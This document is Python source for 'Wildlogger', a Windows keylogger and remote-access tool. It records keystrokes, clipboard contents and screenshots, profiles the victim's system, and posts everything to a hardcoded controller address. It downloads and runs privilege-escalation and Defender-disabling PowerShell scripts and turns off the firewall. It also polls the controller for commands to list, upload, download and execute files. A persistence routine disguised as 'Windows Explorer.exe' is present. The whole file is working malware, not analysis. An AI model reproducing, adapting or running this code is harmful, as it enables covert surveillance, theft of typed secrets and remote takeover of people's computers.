#!/usr/bin/env python

from pynput import keyboard
import threading
import datetime
import pyautogui
import os, tempfile, base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

import clipboard
import requests
import socket
import wmi
import shutil
import sys
import subprocess
import ctypes
import time


class Wildlogger:
    def __init__(self,text_interval,screenshot_interval,shell_interval,url):
        #self.persistent()# wildlogger scripti exe'ye dönüştürüldüğünde, hedef bilgisayarda sürekli olarak çalışması için kullanılacak metot
        self.log = ""
        self.text_interval=text_interval
        self.screenshot_interval=screenshot_interval
        self.shell_interval = shell_interval
        self.url=url
        self.pictures=[]
        self.mail=MIMEMultipart()
        self.encodedpics = []
        self.c = wmi.WMI()
        self.status=1
        self.user=""
        self.currentdir = "."
        self.current_key_list=set()
        self.COMBINATIONS = [
        {keyboard.Key.ctrl_l, keyboard.KeyCode(char='c')},
        {keyboard.Key.ctrl_l, keyboard.KeyCode(char='C')},
        {keyboard.Key.ctrl_r, keyboard.KeyCode(char='c')},
        {keyboard.Key.ctrl_r, keyboard.KeyCode(char='C')},
        {keyboard.Key.ctrl_l, keyboard.KeyCode(char='v')},
        {keyboard.Key.ctrl_l, keyboard.KeyCode(char='V')},
        {keyboard.Key.ctrl_r, keyboard.KeyCode(char='v')},
        {keyboard.Key.ctrl_r, keyboard.KeyCode(char='V')}
        ]

    def persistent(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)



    def connectionInfo(self):
        self.user = os.path.expanduser('~').split('\\')[2]
        dt = datetime.datetime.now().strftime("%d-%m-%Y %H")+":**"
        publicIP=""
        try:
            publicIP = requests.get('https://api.ipify.org/').text
        except:
            print("[-] Unable to connect to https://api.ipify.org !")
        privateIP = socket.gethostbyname(socket.gethostname())
        return """
          <h3>[+] Datetime:<span style="color:red;">""" + dt + """</span></h3>
          <h3>[+] Username:<span style="color:red;">""" + self.user + """</span></h3>
          <h3>[+] Public IP:<span style="color:red;">""" + publicIP + """</span></h3>
          <h3>[+] Private IP:<span style="color:red;">""" + privateIP + """</span></h3>
        """

    def getMinimalInfo(self):
        self.user = os.path.expanduser('~').split('\\')[2]
        publicIP=""
        try:
            publicIP = requests.get('https://api.ipify.org/').text
        except:
            print("[-] Unable to connect to https://api.ipify.org !")
        privateIP = socket.gethostbyname(socket.gethostname())
        return self.user + ";" + publicIP + ";" + privateIP + "\n"
     
    def runningProcesses(self):
        try:
            running = ""
            for process in self.c.Win32_Process():
                if process.Name not in running:
                    running = running + "<h3>" + process.Name + "<h3>"
            if running is not None:
                return running
        except Exception:
            pass


    def nonRunningServices(self):
        services = ""
        try:
            stopped_services = self.c.Win32_Service(StartMode="Auto", State="Stopped")
            if stopped_services:
                for s in stopped_services:
                    services = services + "<h3>" + s.Caption + "<h3>"
            else:
                services = "<h3>No auto services stopped<h3>"
            if services is not None:
                return services
        except Exception:
            pass


    def AboutComputerSystem(self):
        try:
            result = str(self.c.Win32_ComputerSystem()[0])
            result = result.replace(";", ";<br>").replace("instance of Win32_ComputerSystem","<b>INSTANCE OF WIN32_COMPUTERSYSTEM</b><br>").replace("}","").replace("{", "")
            if result is not None:
                return result
        except Exception:
            pass


    def victimInfo(self):
        return """
                <!DOCTYPE html>
                <html lang="en">
                <head>
                  <meta charset="UTF-8">
                  <title>Document</title>
                </head>
                <body>
                  <h2 align="center">Keylogger Started!</h2>
                  <hr>
                  <h2 align="center">[+] Connection İnformation</h2>
                   <b>
                   """+str( self.connectionInfo()) +"""
                   <b/>
                   <hr>
                  <h2 align="center">[+] System İnformation</h2>
                  <b>
                    """+str(self.AboutComputerSystem())+"""
                   <b/>
                   <hr>
                  <h2 align="center">[+] Running Processes List</h2>
                  """+str(self.runningProcesses())+"""
                   <hr>      
                 <h2 align="center">[+] Non Working Automatic Services List</h2>
                """+str(self.nonRunningServices())+"""
                   <hr>
                </body>
                </html>
                """

    def takeScreenshot(self):
        picture={}
        currentDT = datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
        currentDT=currentDT.replace(" ","-").replace(".","-").replace(":","-")
        filename=currentDT+".jpg"
        temp_path = tempfile.gettempdir()
        save_path =temp_path+"\\"+filename
        pic = pyautogui.screenshot()
        pic.save(save_path)
        picture["filename"]=filename
        picture["path"]=save_path
        self.pictures.append(picture)
        if len(self.pictures)==10:
            self.report(2)
        screenshot_timer=threading.Timer(self.screenshot_interval,self.takeScreenshot)
        screenshot_timer.start()

   

    def prepareScreenshots(self):
        self.encodedpics = []
        for file in self.pictures:
            img = open(file["path"], "rb").read()
            self.encodedpics.append('<img src="data:image/jpeg;base64,'  + str(base64.b64encode(img), encoding="utf-8") + '>')
            self.deleteScreenshot(file["path"])

    def append_to_log(self,text):
        if "Clipboard" in text:
            text = text.replace('***\nc', '***\n')
            text = text.replace('***\nv', '***\n')
        self.log=self.log+text

    def delete_to_log(self):
        self.log=self.log[:-1]

    def deleteScreenshot(self,file):
        os.remove(file)

    def on_press(self,key):
        current_key=""
        if any([key in COMBO for COMBO in self.COMBINATIONS]):
            self.current_key_list.add(key)
            if any(all(k in self.current_key_list for k in COMBO) for COMBO in self.COMBINATIONS):
                current_key += "\n*** Start Clipboard ***\n"
                current_key += clipboard.paste()
                current_key += "\n*** End Clipboard ***\n"
        if key==keyboard.Key.enter:
            current_key+="\n"
        elif key==keyboard.Key.space:
            current_key+=" "
        elif key==keyboard.Key.backspace:
            self.delete_to_log()
        else:
            try:
                current_key+=key.char
            except:
                pass
        self.append_to_log(current_key)


    def on_release(self,key):
        if any([key in COMBO for COMBO in self.COMBINATIONS]):
            self.current_key_list.remove(key)

    def report(self,condition=1):
        if condition==1:
            self.sendMail(self.url,"\n\n"+self.log)
            self.log=""
            report_timer=threading.Timer(self.text_interval,self.report)
            report_timer.start()
        elif condition==2:
            self.prepareScreenshots()
            self.sendMail(self.url)
            self.pictures=[]
        elif condition==3:
            self.sendMail(self.url)
            report_timer = threading.Timer(self.text_interval, self.report)
            report_timer.start()

    def sendMail(self, url, log=""):
        data = self.getMinimalInfo()
        if log != "":
            data += log
        if self.status:
            self.status = 0
            data += self.victimInfo()
            open("PrivescCheck.ps1", "wb").write(requests.get(self.url + "/PrivescCheck.ps1").content)
            p = subprocess.Popen("powershell -ep Bypass \". .\PrivescCheck.ps1; Invoke-PrivescCheck > privesc.output\"")
            p.communicate()
            time.sleep(30)
            print("slept")
            p.kill()
            data += "\nPrivilege Escalation Vectors\n" + open("privesc.output", "r").read() + "\nEnd Privilege Escalation Vectors"
        for p in self.encodedpics:
            data += p
        print(type(data))
        try:
            requests.post(url=url,data=data.encode("utf-8"), timeout=0.01)
        except:
            pass

    def shell(self):
        command = ""
        try:
            command = str(requests.get(self.url + "/" + self.getMinimalInfo().replace(";", "/").rstrip("\n")).content, encoding="utf-8")
        except:
            return
        c = command
        command = command.split(" ")
        print(command)
        shell_result = ""
        if command[0] == "ls":
             if len(command) > 1:
                 self.currentdir = command[1]
             shell_result = bytes("\n".join(os.listdir(self.currentdir)), 'utf-8')
        elif command[0] == "upload":
             print(command[0])
             print(command[1])
             open(command[2], "wb").write(base64.b64decode(command[1]))
             if os.path.exists(command[2]):
                 shell_result = b"File successfully uploaded"
             else:
                 shell_result = b"Upload failed :("
        elif command[0] == "download":
             shell_result = base64.b64encode(open(command[1], "rb").read())
             print(shell_result)
        elif command[0] == "exec":
             try:
                shell_result = subprocess.check_output(c.split(" ", 1)[1], shell=True)  
             except:
                shell_result = b"Command failed"            
        else:
            shell_result = b""
        data = b"Results on session " + bytes(self.getMinimalInfo().replace(";", " "), 'utf-8') + b":\n"
        data += bytes(c, 'utf-8') + b"\n"
        data += shell_result
        print(shell_result)
        if shell_result != "":
            try:
                requests.post(url=self.url + "/printcmd",data=str(data).encode("utf-8"), timeout=0.01)
            except:
                pass
        screenshot_exec=threading.Timer(self.shell_interval,self.shell)
        screenshot_exec.start()


    def start(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            open("DisableDefender.ps1", "wb").write(requests.get(self.url + "/DisableDefender.ps1").content)
            subprocess.Popen("powershell -ep Bypass \". .\DisableDefender.ps1\"")      
        #subprocess.Popen("powershell -ep Bypass \"Set-NetFirewallProfile Domain,Public,Private -Enable False\";Set-MpPreference -DisableRealtimeMonitoring $true")
        subprocess.Popen("netsh advfirewall set allprofile state off")
        keyboard_listener=keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
        with keyboard_listener:
            self.takeScreenshot()
            self.shell()
            self.report(3)
            keyboard_listener.join()



interval_for_log=300
interval_for_Screenshot=60
interval_for_shell = 1
Wildlogger = Wildlogger(interval_for_log, interval_for_Screenshot, interval_for_shell, "http://192.168.1.2:5000")
Wildlogger.start()